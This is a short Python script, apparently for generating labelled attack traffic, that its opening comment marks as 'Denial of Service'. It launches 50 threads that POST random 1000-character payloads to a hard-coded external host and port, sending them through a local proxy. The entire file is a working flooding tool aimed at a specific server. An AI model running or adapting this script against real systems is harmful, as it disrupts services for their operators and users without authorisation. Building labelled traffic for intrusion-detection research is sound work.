#!/usr/bin/python3
# All requests issued by this program are to be labeled 'Denial of Service'

import threading
import secrets
import requests
import string

payload_queue = []
payload_lock = threading.Lock()

NUM_THREADS = 50
THREADS = [None] * NUM_THREADS
NUM_PAYLOADS = 100
PAYLOAD_LEN = 1000

def thread_func():
	global payload_queue
	global payload_lock

	while True:
		item = None
		with payload_lock:
			if not payload_queue:
				return
			item = payload_queue.pop()

		if not item:
			return

		try:
			r = requests.post('http://icnc.go.ro:23231/', data=item, proxies={'http':'http://127.0.0.1:8080/'})
		except:
			print('Error on request')

if __name__ == '__main__':
	letters = string.ascii_letters
	for i in range(NUM_PAYLOADS):
		payload_queue.append(''.join([secrets.choice(letters) for i in range(PAYLOAD_LEN)]))

	for i in range(NUM_THREADS):
		THREADS[i] = threading.Thread(target=thread_func)
		THREADS[i].start()

	for i in range(NUM_THREADS):
		THREADS[i].join()
